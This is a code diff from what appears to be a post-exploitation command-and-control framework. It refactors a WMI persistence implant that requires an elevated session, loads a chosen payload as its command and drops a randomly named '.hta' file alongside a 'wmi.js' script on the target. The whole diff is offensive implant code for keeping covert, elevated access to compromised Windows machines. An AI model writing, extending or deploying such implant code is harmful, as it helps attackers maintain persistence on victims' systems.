@@ -1,6 +1,8 @@
 import core.job
 import core.implant
 import uuid
+import string
+import random
 
 class WMIPersistJob(core.job.Job):
     def create(self):
@@ -10,6 +12,17 @@ class WMIPersistJob(core.job.Job):
         if self.session.elevated != 1:
             self.error("0", "This job requires an elevated session.", "Not elevated", "")
             return False
+        id = self.options.get("PAYLOAD")
+        payload = self.load_payload(id)
+        self.options.set("CMD", payload)
+        self.options.set("DIRECTORY", self.options.get('DIRECTORY').replace("\\", "\\\\").replace('"', '\\"'))
+        self.options.set("FDROPDIR", self.options.get('DROPDIR').replace("\\", "\\\\").replace('"', '\\"'))
+
+        if self.options.get('DROPFILE'):
+            self.options.set('FDROPFILE', self.options.get('DROPFILE')+'.hta')
+        else:
+            self.options.set('DROPFILE', ''.join(random.choice(string.ascii_uppercase) for _ in range(10)))
+            self.options.set('FDROPFILE', self.options.get('DROPFILE')+'.hta')
 
     def report(self, handler, data, sanitize = False):
         task =  handler.get_header("Task", False)
@@ -127,19 +140,7 @@ class WMIPersistImplant(core.implant.Implant):
             self.shell.print_error("Payload %s not found." % id)
             return
 
-        self.options.set("CMD", payload)
-        self.options.set("DIRECTORY", self.options.get('DIRECTORY').replace("\\", "\\\\").replace('"', '\\"'))
-        self.options.set("FDROPDIR", self.options.get('DROPDIR').replace("\\", "\\\\").replace('"', '\\"'))
-
-        if self.options.get('DROPFILE'):
-            self.options.set('FDROPFILE', self.options.get('DROPFILE')+'.hta')
-        else:
-            import string
-            import random
-            self.options.set('DROPFILE', ''.join(random.choice(string.ascii_uppercase) for _ in range(10)))
-            self.options.set('FDROPFILE', self.options.get('DROPFILE')+'.hta')
-
         payloads = {}
-        payloads["js"] = self.loader.load_script("data/implant/persist/wmi.js", self.options)
+        payloads["js"] = "data/implant/persist/wmi.js"
 
         self.dispatch(payloads, self.job)
